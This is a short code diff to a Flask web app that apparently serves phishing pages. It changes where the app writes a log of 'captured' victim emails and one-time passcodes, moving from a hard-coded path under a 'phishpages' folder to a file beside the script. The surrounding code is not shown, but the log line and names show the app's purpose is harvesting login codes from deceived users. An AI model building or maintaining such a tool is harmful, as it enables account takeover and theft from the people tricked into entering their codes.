@@ -1,5 +1,9 @@
 from flask import Flask, request, redirect, send_file, render_template_string
 import datetime
+import os
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+LOG_FILE = os.path.join(BASE_DIR, "captured_otp.txt")
 
 app = Flask(__name__)
 
@@ -81,7 +85,7 @@ def verify():
 
     log_entry = f"[{timestamp}] OTP CAPTURED — Email: {email} | OTP: {otp}\n"
 
-    with open("/home/factor/phishpages/captured_otp.txt", "a") as f:
+    with open(LOG_FILE, "a") as f:
         f.write(log_entry)
 
     print("\n" + "="*60)
